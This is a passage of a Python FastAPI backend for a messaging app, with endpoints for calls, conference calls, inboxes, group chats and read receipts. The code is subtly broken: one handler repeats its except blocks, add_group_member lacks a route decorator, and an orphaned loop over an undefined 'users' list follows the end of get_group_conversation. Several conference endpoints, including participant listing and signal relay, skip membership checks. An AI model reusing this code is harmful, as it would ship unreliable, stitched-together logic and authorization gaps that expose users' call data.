    Exists so a caller whose WebSocket dropped can still connect: it would
    otherwise ring forever while the callee sits in an established call.
    """
    call = db.query(Call).filter(Call.id == call_id).first()
    if not call:
        raise HTTPException(status_code=404, detail="Call not found")

    user_id = int(getattr(current_user, 'id', 0))
    if call.caller_id != user_id and call.recipient_id != user_id:
        raise HTTPException(status_code=403, detail="Not authorized to view this call")

    # Only the caller needs the answer, and only once.
    answer_sdp = None
    if user_id == call.caller_id:
        answer_sdp = _pending_answer_sdp.get(int(call_id))

    return {
        "call_id": int(call.id),
        "status": str(call.status),
        "call_type": str(call.call_type),
        "answer_sdp": answer_sdp,
    }


@app.post("/calls/action")
async def call_action(
    action_data: CallAction,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Perform an action on a call (accept, decline, end, etc.)"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        
        # Master token on accept — the owner authenticating themselves before the
        # line opens. A wrong token must not end the call: the client keeps it
        # ringing and prompts again.
        if action_data.action == "accept":
            if REQUIRE_MASTER_TOKEN_FOR_CALLS and not action_data.mastertoken:
                raise HTTPException(status_code=401, detail="Master token required to accept call")
            if action_data.mastertoken and not validate_master_token(db, user_id, action_data.mastertoken):
                raise HTTPException(status_code=401, detail="Invalid master token")

        call = await CallService.update_call_status(
            db, action_data.call_id, user_id, action_data.action, action_data.answer_sdp
        )
        return {
            "call_id": int(call.id),
            "status": action_data.action,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Call action error: {e}")
        raise HTTPException(status_code=500, detail="Failed to perform call action")

@app.post("/calls/{call_id}/media-state")
async def set_call_media_state(
    call_id: int,
    payload: dict,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """
    Tell the other party whether our microphone is muted.

    WebRTC gives no signal for this: a muted track simply carries silence, which
    is indistinguishable from someone not talking. Without it the UI cannot show
    who is muted.
    """
    user_id = int(getattr(current_user, 'id', 0))
    username = str(getattr(current_user, 'username', ''))

    call = db.query(Call).filter(Call.id == call_id).first()
    if not call:
        raise HTTPException(status_code=404, detail="Call not found")
    if call.caller_id != user_id and call.recipient_id != user_id:
        raise HTTPException(status_code=403, detail="Not authorized for this call")

    other_party_id = call.recipient_id if user_id == call.caller_id else call.caller_id
    await ws_manager.send_to_user(other_party_id, {
        "type": "call_media_state",
        "data": {
            "call_id": int(call_id),
            "username": username,
            "muted": bool(payload.get("muted", False)),
        }
    })
    return {"success": True}


@app.post("/calls/ice_candidate")
async def send_ice_candidate(
    payload: IceCandidatePayload,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Forward a WebRTC ICE candidate to the other party"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        success = await CallService.forward_ice_candidate(
            db, user_id, payload.call_id, payload.recipient_username, payload.candidate
        )
        if not success:
            raise HTTPException(status_code=400, detail="Failed to forward ICE candidate (recipient offline or call invalid)")
        return {"success": True}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Send ICE candidate error: {e}")
        raise HTTPException(status_code=500, detail="Failed to forward ICE candidate")


@app.post("/calls/conference/create")
async def create_conference(
    payload: dict,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Upgrade an existing 2-party call into a conference session"""
    call_id = payload.get("call_id")
    caller_id = int(getattr(current_user, 'id', 0))
    call = db.query(Call).filter(Call.id == call_id).first() if call_id else None
    conf = ConferenceSession(
        created_by_user_id=caller_id,
        original_call_id=call_id,
        is_active=True,
    )
    db.add(conf)
    db.flush()
    # Add creator as first participant
    db.add(ConferenceParticipant(conference_id=conf.id, user_id=caller_id))
    # Add the other party if call provided. The column is recipient_id — reading
    # callee_id raised AttributeError here, so creating a conference from a live
    # call always failed with a 500 and "add participant" never worked.
    if call:
        other_id = (int(call.caller_id) if int(call.recipient_id) == caller_id
                    else int(call.recipient_id))
        db.add(ConferenceParticipant(conference_id=conf.id, user_id=other_id))
    db.commit()
    db.refresh(conf)
    return {"conference_id": conf.id}


@app.post("/calls/conference/{conference_id}/invite")
async def conference_invite(
    conference_id: int,
    payload: dict,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Invite a new participant into an active conference"""
    invitee_username = payload.get("username")
    caller_id = int(getattr(current_user, 'id', 0))
    caller_username = str(getattr(current_user, 'username', ''))

    conf = db.query(ConferenceSession).filter(
        ConferenceSession.id == conference_id,
        ConferenceSession.is_active == True
    ).first()
    if not conf:
        raise HTTPException(status_code=404, detail="Conference not found or ended")

    invitee = db.query(User).filter(User.username == invitee_username, User.is_active == True).first()
    if not invitee:
        raise HTTPException(status_code=404, detail="User not found")

    invitee_id = int(getattr(invitee, 'id'))
    already_in = db.query(ConferenceParticipant).filter(
        ConferenceParticipant.conference_id == conference_id,
        ConferenceParticipant.user_id == invitee_id,
        ConferenceParticipant.is_active == True,
    ).first()
    if already_in:
        raise HTTPException(status_code=400, detail="User already in conference")

    active_count = db.query(ConferenceParticipant).filter(
        ConferenceParticipant.conference_id == conference_id,
        ConferenceParticipant.is_active == True,
    ).count()
    if active_count >= CONFERENCE_MAX_PARTICIPANTS:
        raise HTTPException(
            status_code=400,
            detail=f"Call is full ({CONFERENCE_MAX_PARTICIPANTS} participants maximum)",
        )

    # The invitee is recorded as pending (is_active False) and only becomes a
    # participant once they accept. Joining someone to a live call without their
    # consent would open their microphone to it.
    db.add(ConferenceParticipant(conference_id=conference_id, user_id=invitee_id, is_active=False))
    db.commit()

    existing = db.query(ConferenceParticipant).filter(
        ConferenceParticipant.conference_id == conference_id,
        ConferenceParticipant.user_id != invitee_id,
        ConferenceParticipant.is_active == True,
    ).all()
    existing_usernames = [
        str(getattr(db.query(User).filter(User.id == p.user_id).first(), 'username', ''))
        for p in existing
    ]

    # Ring the invitee. Peer connections are set up in /accept, not here.
    sent = await ws_manager.send_to_user(invitee_id, {
        "type": "conference_invite",
        "data": {
            "conference_id": conference_id,
            "invited_by": caller_username,
            "existing_participants": existing_usernames,
        }
    })
    if not sent:
        try:
            await push_to_user(
                db, invitee_id, "Group call",
                f"{caller_username} is adding you to a call", sound="ringingtone.caf",
            )
        except Exception as e:
            logger.warning(f"Conference invite push failed: {e}")

    return {"success": True, "conference_id": conference_id}


@app.post("/calls/conference/{conference_id}/accept")
async def conference_accept(
    conference_id: int,
    payload: dict = None,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """
    Join a conference you were invited to.

    Requires the master token for the same reason a direct call does: it proves
    the owner is the one answering. Only after this do the existing participants
    build peer connections to the newcomer.
    """
    user_id = int(getattr(current_user, 'id', 0))
    username = str(getattr(current_user, 'username', ''))
    payload = payload or {}

    if REQUIRE_MASTER_TOKEN_FOR_CALLS and not payload.get("mastertoken"):
        raise HTTPException(status_code=401, detail="Master token required to join call")
    if payload.get("mastertoken") and not validate_master_token(db, user_id, payload["mastertoken"]):
        raise HTTPException(status_code=401, detail="Invalid master token")

    conf = db.query(ConferenceSession).filter(
        ConferenceSession.id == conference_id,
        ConferenceSession.is_active == True
    ).first()
    if not conf:
        raise HTTPException(status_code=404, detail="Conference not found or ended")

    part = db.query(ConferenceParticipant).filter(
        ConferenceParticipant.conference_id == conference_id,
        ConferenceParticipant.user_id == user_id,
    ).first()
    if not part:
        raise HTTPException(status_code=403, detail="You were not invited to this call")

    part.is_active = True
    part.joined_at = datetime.utcnow()
    db.commit()

    existing = db.query(ConferenceParticipant).filter(
        ConferenceParticipant.conference_id == conference_id,
        ConferenceParticipant.user_id != user_id,
        ConferenceParticipant.is_active == True,
    ).all()

    # Existing participants create the offers; the newcomer answers.
    for p in existing:
        await ws_manager.send_to_user(p.user_id, {
            "type": "conference_peer_connect",
            "data": {
                "conference_id": conference_id,
                "peer_username": username,
                "role": "offer",
            }
        })

    return {
        "success": True,
        "conference_id": conference_id,
        "participants": [
            str(getattr(db.query(User).filter(User.id == p.user_id).first(), 'username', ''))
            for p in existing
        ],
    }


@app.post("/calls/conference/{conference_id}/decline")
async def conference_decline(
    conference_id: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Turn down a conference invite."""
    user_id = int(getattr(current_user, 'id', 0))
    username = str(getattr(current_user, 'username', ''))

    part = db.query(ConferenceParticipant).filter(
        ConferenceParticipant.conference_id == conference_id,
        ConferenceParticipant.user_id == user_id,
        ConferenceParticipant.is_active == False,
    ).first()
    if part:
        db.delete(part)
        db.commit()

    others = db.query(ConferenceParticipant).filter(
        ConferenceParticipant.conference_id == conference_id,
        ConferenceParticipant.is_active == True,
    ).all()
    for p in others:
        await ws_manager.send_to_user(p.user_id, {
            "type": "conference_invite_declined",
            "data": {"conference_id": conference_id, "username": username},
        })

    return {"success": True}


@app.post("/calls/conference/{conference_id}/signal")
async def conference_signal(
    conference_id: int,
    payload: dict,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Relay SDP offer/answer or ICE candidate between conference participants"""
    to_username = payload.get("to")
    signal_type = payload.get("signal_type")   # offer | answer | ice_candidate
    signal_data = payload.get("data")
    from_username = str(getattr(current_user, 'username', ''))
    from_id = int(getattr(current_user, 'id', 0))

    target = db.query(User).filter(User.username == to_username, User.is_active == True).first()
    if not target:
        raise HTTPException(status_code=404, detail="Target user not found")

    await ws_manager.send_to_user(int(getattr(target, 'id')), {
        "type": "conference_signal",
        "data": {
            "conference_id": conference_id,
            "from": from_username,
            "signal_type": signal_type,
            "data": signal_data,
        }
    })
    return {"success": True}


@app.post("/calls/conference/{conference_id}/leave")
async def conference_leave(
    conference_id: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Leave a conference session"""
    user_id = int(getattr(current_user, 'id', 0))
    username = str(getattr(current_user, 'username', ''))

    part = db.query(ConferenceParticipant).filter(
        ConferenceParticipant.conference_id == conference_id,
        ConferenceParticipant.user_id == user_id,
        ConferenceParticipant.is_active == True,
    ).first()
    if part:
        setattr(part, 'is_active', False)
        setattr(part, 'left_at', datetime.now(timezone.utc))
        db.commit()

    # Notify remaining participants
    remaining = db.query(ConferenceParticipant).filter(
        ConferenceParticipant.conference_id == conference_id,
        ConferenceParticipant.is_active == True,
    ).all()
    for p in remaining:
        await ws_manager.send_to_user(p.user_id, {
            "type": "conference_participant_left",
            "data": {"conference_id": conference_id, "username": username}
        })

    # End conference if ≤1 participant left
    if len(remaining) <= 1:
        conf = db.query(ConferenceSession).filter(ConferenceSession.id == conference_id).first()
        if conf:
            setattr(conf, 'is_active', False)
            setattr(conf, 'ended_at', datetime.now(timezone.utc))
            db.commit()

    return {"success": True}


@app.get("/calls/conference/{conference_id}/participants")
async def conference_participants(
    conference_id: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Get active participants in a conference"""
    parts = db.query(ConferenceParticipant).join(User).filter(
        ConferenceParticipant.conference_id == conference_id,
        ConferenceParticipant.is_active == True,
    ).all()
    return {
        "participants": [
            {"user_id": p.user_id, "username": str(getattr(p.user, 'username', ''))}
            for p in parts
        ]
    }


@app.get("/messages/inbox")
async def get_inbox(current_user: User = Depends(get_current_user),
                   db: Session = Depends(get_database_session)):
    """Get user's inbox"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        messages = MessageService.get_user_messages(db, user_id)
        
        result = []
        for msg in messages:
            sender = db.query(User).filter(User.id == msg.sender_id).first()
            recipient = db.query(User).filter(User.id == msg.recipient_id).first()
            result.append({
                "id": int(getattr(msg, 'id', 0)),
                "sender": str(getattr(sender, 'username', '')) if sender else "unknown",
                "recipient": str(getattr(recipient, 'username', '')) if recipient else "group",
                "group_id": int(getattr(msg, 'group_id', 0)) if getattr(msg, 'group_id', None) else None,
                "is_admin_announcement": bool(getattr(msg, 'is_admin_announcement', False)),
                "content": str(getattr(msg, 'encrypted_content', '')),
                "content_type": str(getattr(msg, 'content_type', '')),
                "encrypted_key": getattr(msg, 'encrypted_key', None),
                "iv": getattr(msg, 'iv', None),
                "decoy_content": str(getattr(msg, 'decoy_content', '') or ''),
                "timestamp": getattr(msg, 'timestamp', datetime.now(timezone.utc)).isoformat(),
                "delivered": bool(getattr(msg, 'delivered', False)),
                "read": bool(getattr(msg, 'read', False))
            })
        
        return {
            "messages": result,
            "count": len(result)
        }
        
    except Exception as e:
        logger.error(f"Inbox error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve inbox")


@app.get("/messages/conversation/{partner_username}")
async def get_conversation(
    partner_username: str,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Get all messages between the current user and a specific partner (both directions)."""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        partner = db.query(User).filter(User.username == partner_username, User.is_active == True).first()
        if not partner:
            raise HTTPException(status_code=404, detail="Partner user not found")
        partner_id = int(getattr(partner, 'id', 0))

        msgs = db.query(Message).filter(
            or_(
                and_(Message.sender_id == user_id, Message.recipient_id == partner_id),
                and_(Message.sender_id == partner_id, Message.recipient_id == user_id),
            )
        ).order_by(Message.timestamp.asc()).limit(200).all()

        current_username = str(getattr(current_user, 'username', ''))
        result = []
        for msg in msgs:
            result.append({
                "id": int(getattr(msg, 'id', 0)),
                "sender": current_username if msg.sender_id == user_id else partner_username,
                "recipient": partner_username if msg.sender_id == user_id else current_username,
                "is_admin_announcement": bool(getattr(msg, 'is_admin_announcement', False)),
                "content": str(getattr(msg, 'encrypted_content', '')),
                "decoy_content": str(getattr(msg, 'decoy_content', '') or ''),
                "content_type": str(getattr(msg, 'content_type', '')),
                "encrypted_key": getattr(msg, 'encrypted_key', None),
                "iv": getattr(msg, 'iv', None),
                "timestamp": getattr(msg, 'timestamp', datetime.now(timezone.utc)).isoformat(),
                "delivered": bool(getattr(msg, 'delivered', False)),
                "read": bool(getattr(msg, 'read', False)),
            })

        return {"messages": result, "count": len(result)}

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Conversation fetch error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve conversation")


@app.get("/messages/offline")
async def get_offline_messages(current_user: User = Depends(get_current_user),
                              db: Session = Depends(get_database_session)):
    """Get offline messages"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        messages = MessageService.get_offline_messages(db, user_id)
        
        result = []
        for msg in messages:
            sender = db.query(User).filter(User.id == msg.sender_id).first()
            recipient = db.query(User).filter(User.id == msg.recipient_id).first()
            result.append({
                "id": int(getattr(msg, 'id', 0)),
                "sender": str(getattr(sender, 'username', '')) if sender else "unknown",
                "recipient": str(getattr(recipient, 'username', '')) if recipient else "unknown",
                "content": str(getattr(msg, 'encrypted_content', '')),
                "content_type": str(getattr(msg, 'content_type', '')),
                "timestamp": getattr(msg, 'timestamp', datetime.now(timezone.utc)).isoformat()
            })
            
            # Mark as delivered
            message_id = int(getattr(msg, 'id', 0))
            MessageService.mark_message_delivered(db, message_id)
        
        return {
            "messages": result,
            "count": len(result)
        }
        
    except Exception as e:
        logger.error(f"Offline messages error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve offline messages")

@app.put("/messages/{message_id}/read")
async def mark_message_read(message_id: int,
                           current_user: User = Depends(get_current_user),
                           db: Session = Depends(get_database_session)):
    """Mark message as read - allowed for both sender and recipient"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        # Allow either sender or recipient to mark as read
        message = db.query(Message).filter(
            and_(
                Message.id == message_id,
                or_(Message.recipient_id == user_id, Message.sender_id == user_id)
            )
        ).first()
        
        if not message:
            raise HTTPException(status_code=404, detail="Message not found")
        
        success = MessageService.mark_message_read(db, message_id)
        
        if success:
            return {"message": "Message marked as read"}
        else:
            raise HTTPException(status_code=500, detail="Failed to mark message as read")
            
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Mark read error: {e}")
        raise HTTPException(status_code=500, detail="Failed to mark message as read")


class AdminUserRegistrationDetails(BaseModel):
    """Model for admin user registration details response"""
    username: str = Field(..., description="Username for the user account")
    phone_number: str = Field(..., description="Phone number for the user account")
    token: str = Field(..., description="Authentication token for the user")
    message: str = Field(..., description="Instructional message for sharing with user")

@app.post("/register")
async def register_user(user_data: UserRegistration,
                       db: Session = Depends(get_database_session)):
    """Register new user"""
    try:
        user = UserService.register_user(db, user_data.username,
                                       user_data.phone_number,
                                       user_data.password,
                                       user_data.public_key,
                                       user_data.token)

        if user:
            return {
                "username": user.username,
                "phone_number": user.phone_number,
                "registered": user.registered.isoformat(),
                "last_login": user.last_login.isoformat() if user.last_login else None
            }

    except Exception as e:
        logger.error(f"Registration error: {e}")
        raise HTTPException(status_code=400, detail="Failed to register user")




@app.post("/messages/mark_read")
async def mark_message_as_read(message_id: int,
                               current_user: User = Depends(get_current_user),
                               db: Session = Depends(get_database_session)):
    """Mark a message as read"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        UserService.mark_message_read(db, message_id, user_id)
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Mark read error: {e}")
        raise HTTPException(status_code=500, detail="Failed to mark message as read")
            
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Mark read error: {e}")
        raise HTTPException(status_code=500, detail="Failed to mark message as read")

@app.get("/messages/conversations")
async def get_conversations(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Get list of users the current user has exchanged messages with"""
    try:
        user_id = int(getattr(current_user, 'id', 0))

        msgs = db.query(Message).filter(
            or_(
                Message.sender_id == user_id,
                Message.recipient_id == user_id
            )
        ).order_by(Message.timestamp.desc()).all()

        seen: set = set()
        partner_ids: list = []
        for msg in msgs:
            pid = msg.recipient_id if msg.sender_id == user_id else msg.sender_id
            if pid not in seen:
                seen.add(pid)
                partner_ids.append(pid)

        result = []
        for pid in partner_ids:
            partner = db.query(User).filter(User.id == pid, User.is_active == True).first()
            if partner:
                result.append({
                    "username": str(getattr(partner, 'username', '')),
                    "is_active": bool(getattr(partner, 'is_active', False)),
                })
        return result
    except Exception as e:
        logger.error(f"Conversations fetch error: {e}")
        raise HTTPException(status_code=500, detail="Failed to fetch conversations")


@app.get("/users")
async def get_users(current_user: User = Depends(get_current_user),
                   db: Session = Depends(get_database_session)):
    """Get list of users"""
    try:
        users = UserService.get_all_users(db)
        
        result = []
        for user in users:
            result.append({
                "username": str(getattr(user, "username", "")),
                "is_active": bool(getattr(user, "is_active", True))
            })
        return result
    except Exception as e:
        logger.error(f"Error fetching users: {e}")
        raise HTTPException(status_code=500, detail="Failed to fetch users")

# --- Group Chat Endpoints ---

@app.post("/groups/create", response_model=GroupResponse)
async def create_group_route(
    group_data: GroupCreate,
    current_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Create a new group chat (admin only)"""
    try:
        admin_user_id = int(getattr(current_user, 'id', 0))
        group = GroupService.create_group(
            db, admin_user_id, group_data.name, group_data.description, group_data.members
        )
        
        return {
            "id": int(group.id),
            "name": str(group.name),
            "description": group.description,
            "created_at": group.created_at,
            "created_by": int(group.created_by),
            "member_count": len(group.members)
        }
    except Exception as e:
        logger.error(f"Group creation error: {e}")
        raise HTTPException(status_code=500, detail=f"Failed to create group: {str(e)}")

@app.get("/groups", response_model=List[GroupResponse])
async def get_groups(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Get all groups the user belongs to"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        groups = GroupService.get_user_groups(db, user_id)
        
        result = []
        for g in groups:
            result.append({
                "id": int(g.id),
                "name": str(g.name),
                "description": g.description,
                "created_at": g.created_at,
                "created_by": int(g.created_by),
                "member_count": len(g.members)
            })
        return result
    except Exception as e:
        logger.error(f"Get groups error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve groups")

@app.get("/groups/{group_id}", response_model=GroupResponse)
async def get_group_details(
    group_id: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Get details of a specific group"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        # Verify user is a member or admin
        membership = db.query(GroupMember).filter(
            GroupMember.group_id == group_id, 
            GroupMember.user_id == user_id
        ).first()
        
        is_sys_admin = bool(getattr(current_user, 'is_admin', False))
        
        if not membership and not is_sys_admin:
            raise HTTPException(status_code=403, detail="You are not a member of this group")
            
        g = db.query(Group).filter(Group.id == group_id).first()
        if not g:
            raise HTTPException(status_code=404, detail="Group not found")
            
        return {
            "id": int(g.id),
            "name": str(g.name),
            "description": g.description,
            "created_at": g.created_at,
            "created_by": int(g.created_by),
            "member_count": len(g.members)
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Get group details error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve group details")

@app.get("/groups/{group_id}/members", response_model=List[GroupMemberResponse])
async def get_group_members(
    group_id: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Get members of a specific group"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        # Verify user is a member
        membership = db.query(GroupMember).filter(
            GroupMember.group_id == group_id, 
            GroupMember.user_id == user_id
        ).first()
        if not membership:
            raise HTTPException(status_code=403, detail="You are not a member of this group")
            
        return GroupService.get_group_members(db, group_id)
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Get group members error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve group members")

@app.post("/groups/{group_id}/leave")
async def leave_group(
    group_id: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Leave a group"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        success = GroupService.leave_group(db, group_id, user_id)
        if success:
            return {"message": "Successfully left the group"}
        else:
            raise HTTPException(status_code=400, detail="Failed to leave group (maybe not a member)")
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Leave group error: {e}")
        raise HTTPException(status_code=500, detail="Failed to leave group")
async def add_group_member(
    group_id: int,
    username: str,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Add a user to a group"""
    try:
        actor_id = int(getattr(current_user, 'id', 0))
        success = GroupService.add_member(db, group_id, username, actor_id)
        if success:
            return {"message": f"User {username} added to group"}
        else:
            raise HTTPException(status_code=400, detail="Failed to add member")
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Add group member error: {e}")
        raise HTTPException(status_code=500, detail="Failed to add group member")

@app.get("/groups/{group_id}/messages", response_model=List[MessageResponse])
async def get_group_messages(
    group_id: int,
    limit: int = 50,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Get all messages for a specific group"""
    user_id = int(getattr(current_user, 'id', 0))
    # Check if user is a member
    membership = db.query(GroupMember).filter(
        GroupMember.group_id == group_id, 
        GroupMember.user_id == user_id
    ).first()
    if not membership:
        raise HTTPException(status_code=403, detail="You are not a member of this group")
        
    messages = db.query(Message).filter(
        Message.group_id == group_id
    ).order_by(Message.timestamp.desc()).limit(limit).all()
    
    # Map messages to response model
    result = []
    for m in messages:
        sender_user = db.query(User).filter(User.id == m.sender_id).first()
        
        # Get who read this message
        read_by_rows = db.query(User.username, GroupMessageRead.user_id, GroupMessageRead.read_at).join(
            GroupMessageRead, User.id == GroupMessageRead.user_id
        ).filter(GroupMessageRead.message_id == m.id).all()
        
        read_by_list = [row.username for row in read_by_rows]
        read_receipts = [{"username": row.username, "read_at": row.read_at} for row in read_by_rows]
        is_read_by_me = any(row.user_id == user_id for row in read_by_rows)
        
        recipient_user = None
        if m.recipient_id:
            recipient_user = db.query(User).filter(User.id == m.recipient_id).first()
        is_private_tagged = m.recipient_id is not None
        can_read_content = (
            not is_private_tagged or
            user_id == m.sender_id or
            user_id == m.recipient_id
        )
        result.append({
            "id": int(m.id),
            "sender": str(getattr(sender_user, 'username', 'Unknown')),
            "recipient": str(getattr(recipient_user, 'username', '')) if recipient_user else "group",
            "content": str(m.encrypted_content) if can_read_content else str(getattr(m, 'decoy_content', '') or '[Private tagged message]'),
            "content_type": str(m.content_type) if can_read_content else "private_tagged",
            "encrypted_key": getattr(m, 'encrypted_key', None) if can_read_content else None,
            "iv": getattr(m, 'iv', None) if can_read_content else None,
            "timestamp": m.timestamp,
            "delivered": bool(m.delivered),
            "read": is_read_by_me,
            "read_by": read_by_list,
            "read_receipts": read_receipts,
            "is_admin_announcement": bool(getattr(m, 'is_admin_announcement', False)),
            "is_private_tagged": is_private_tagged,
            "decoy_content": str(getattr(m, 'decoy_content', '')),
            "group_id": int(group_id)
        })
    return result

@app.post("/groups/{group_id}/messages/{message_id}/read")
async def mark_group_message_read(
    group_id: int,
    message_id: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Mark a group message as read by the current user"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        
        # Verify message exists and belongs to this group
        msg = db.query(Message).filter(Message.id == message_id, Message.group_id == group_id).first()
        if not msg:
            raise HTTPException(status_code=404, detail="Message not found in this group")
            
        # Check if already marked as read
        existing = db.query(GroupMessageRead).filter(
            GroupMessageRead.message_id == message_id,
            GroupMessageRead.user_id == user_id
        ).first()
        
        if not existing:
            new_read = GroupMessageRead(message_id=message_id, user_id=user_id)
            db.add(new_read)
            db.commit()
            
        return {"message": "Message marked as read"}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Mark group message read error: {e}")
        raise HTTPException(status_code=500, detail="Failed to mark message as read")

@app.post("/messages/group/send")
async def send_group_message(
    payload: GroupMessageSend,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Send a message to a group"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        is_admin = bool(getattr(current_user, 'is_admin', False))
        
        addressed_to_id = None
        is_announcement = False

        if payload.addressed_to_username:
            # Find the user — verify they are a group member
            target_user = db.query(User).filter(User.username == payload.addressed_to_username, User.is_active == True).first()
            if not target_user:
                raise HTTPException(status_code=404, detail="Target user not found")
            target_member = db.query(GroupMember).filter(
                GroupMember.group_id == payload.group_id,
                GroupMember.user_id == target_user.id
            ).first()
            if not target_member:
                raise HTTPException(status_code=400, detail="Target user is not a member of this group")
            addressed_to_id = target_user.id
            is_announcement = bool(getattr(current_user, 'is_admin', False))
            
        message = MessageService.send_message_to_group(
            db, user_id, payload.group_id, payload.message, 
            payload.disappear_after_hours, addressed_to_id, is_announcement,
            payload.encrypted_key, payload.iv, payload.decoy_content
        )
        
        # Notify all group members via WebSocket
        members = db.query(GroupMember).filter(GroupMember.group_id == payload.group_id).all()
        sender_username = str(getattr(current_user, 'username', ''))
        
        notification = {
            "type": "new_group_message",
            "data": {
                "message_id": int(message.id),
                "group_id": int(payload.group_id),
                "sender_username": sender_username,
                "recipient_username": payload.addressed_to_username if payload.addressed_to_username else "group",
                "is_admin_announcement": is_announcement,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "decoy_content": getattr(message, 'decoy_content', '')
            }
        }
        
        for member in members:
            if member.user_id != user_id:
                ws_sent = await ws_manager.send_to_user(member.user_id, notification)
                if not ws_sent:
                    await push_to_user(db, member.user_id, "New message", f"From {sender_username}", sound="beep.caf")
                
        return {
            "status": "sent",
            "message_id": int(message.id)
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Send group message error: {e}")
        raise HTTPException(status_code=500, detail="Failed to send group message")

@app.get("/messages/group/{group_id}")
async def get_group_conversation(
    group_id: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Get all messages in a group"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        # Verify membership
        membership = db.query(GroupMember).filter(GroupMember.group_id == group_id, GroupMember.user_id == user_id).first()
        if not membership:
            raise HTTPException(status_code=403, detail="Not a member of this group")
            
        msgs = db.query(Message).filter(Message.group_id == group_id).order_by(Message.timestamp.asc()).limit(200).all()
        
        result = []
        for msg in msgs:
            sender = db.query(User).filter(User.id == msg.sender_id).first()
            recipient = None
            if msg.recipient_id:
                recipient = db.query(User).filter(User.id == msg.recipient_id).first()
                
            is_private_tagged = msg.recipient_id is not None
            can_read_content = (
                not is_private_tagged or
                user_id == msg.sender_id or
                user_id == msg.recipient_id
            )
            result.append({
                "id": int(getattr(msg, 'id', 0)),
                "sender": str(getattr(sender, 'username', '')) if sender else "unknown",
                "recipient": str(getattr(recipient, 'username', '')) if recipient else "group",
                "is_admin_announcement": bool(getattr(msg, 'is_admin_announcement', False)),
                "is_private_tagged": is_private_tagged,
                "content": str(getattr(msg, 'encrypted_content', '')) if can_read_content else str(getattr(msg, 'decoy_content', '') or '[Private tagged message]'),
                "content_type": str(getattr(msg, 'content_type', '')) if can_read_content else "private_tagged",
                "timestamp": getattr(msg, 'timestamp', datetime.now(timezone.utc)).isoformat(),
                "decoy_content": getattr(msg, 'decoy_content', '')
            })
            
        return {"messages": result, "count": len(result)}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Group conversation fetch error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve group conversation")
        current_user_id = int(getattr(current_user, 'id', 0))
        for user in users:
            user_id = int(getattr(user, 'id', 0))
            if user_id != current_user_id:  # Exclude current user
                last_login = getattr(user, 'last_login', None)
                registered = getattr(user, 'registered', datetime.now(timezone.utc))
                result.append({
                    "username": str(getattr(user, 'username', '')),
                    "registered": registered.isoformat() if registered else datetime.now(timezone.utc).isoformat(),
                    "last_login": last_login.isoformat() if last_login else None
                })
        
        return {
            "users": result,
            "count": len(result)
        }
        
    except Exception as e:
        logger.error(f"Get users error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve users")

@app.get("/users/{username}/public_key")
async def get_user_public_key(username: str,
                             current_user: User = Depends(get_current_user),
                             db: Session = Depends(get_database_session)):
    """Get user's public key"""
    try:
        user = UserService.get_user_by_username(db, username)
        if not user:
